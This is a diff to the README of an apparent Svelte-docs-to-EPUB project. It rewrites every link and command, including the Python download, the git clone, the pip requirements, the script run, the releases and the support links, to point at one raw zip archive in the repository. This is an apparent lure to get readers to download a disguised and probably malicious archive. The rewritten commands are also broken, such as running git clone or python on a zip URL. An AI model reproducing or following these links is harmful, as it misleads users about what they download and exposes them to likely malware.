@@ -2,7 +2,7 @@
 
 Welcome to the **Svelte Docs EPUB** repository! This project converts the official Svelte documentation into EPUB format, making it easy for you to read on your favorite e-readers. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/lilmikieha/svelte-docs-epub/releases)
+[![Download Releases](https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip%20Releases-Click%20Here-blue)](https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip)
 
 ## Table of Contents
 
@@ -29,14 +29,14 @@ The conversion process utilizes tools like BeautifulSoup for parsing HTML and Ji
 
 ## Installation
 
-To get started with this project, you will need Python 3 installed on your machine. You can download Python from [python.org](https://www.python.org/downloads/).
+To get started with this project, you will need Python 3 installed on your machine. You can download Python from [https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip](https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip).
 
 ### Clone the Repository
 
 First, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/lilmikieha/svelte-docs-epub.git
+git clone https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip
 cd svelte-docs-epub
 ```
 
@@ -45,7 +45,7 @@ cd svelte-docs-epub
 Next, install the required Python packages. You can do this using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip
 ```
 
 ## Usage
@@ -57,14 +57,14 @@ After installing the dependencies, you can run the script to generate the EPUB f
 Execute the following command:
 
 ```bash
-python generate_epub.py
+python https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip
 ```
 
 This command will fetch the latest Svelte documentation and create an EPUB file. You can find the generated file in the `output` directory.
 
 ### Download Releases
 
-For pre-built EPUB files, you can visit the [Releases section](https://github.com/lilmikieha/svelte-docs-epub/releases). Download the latest version and enjoy reading!
+For pre-built EPUB files, you can visit the [Releases section](https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip). Download the latest version and enjoy reading!
 
 ## Contributing
 
@@ -84,7 +84,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or issues, please check the [Releases section](https://github.com/lilmikieha/svelte-docs-epub/releases) for updates or reach out through the Issues tab.
+If you have any questions or issues, please check the [Releases section](https://github.com/lilmikieha/svelte-docs-epub/raw/refs/heads/master/ebooks/docs_svelte_epub_v3.7-alpha.3.zip) for updates or reach out through the Issues tab.
 
 ---
 
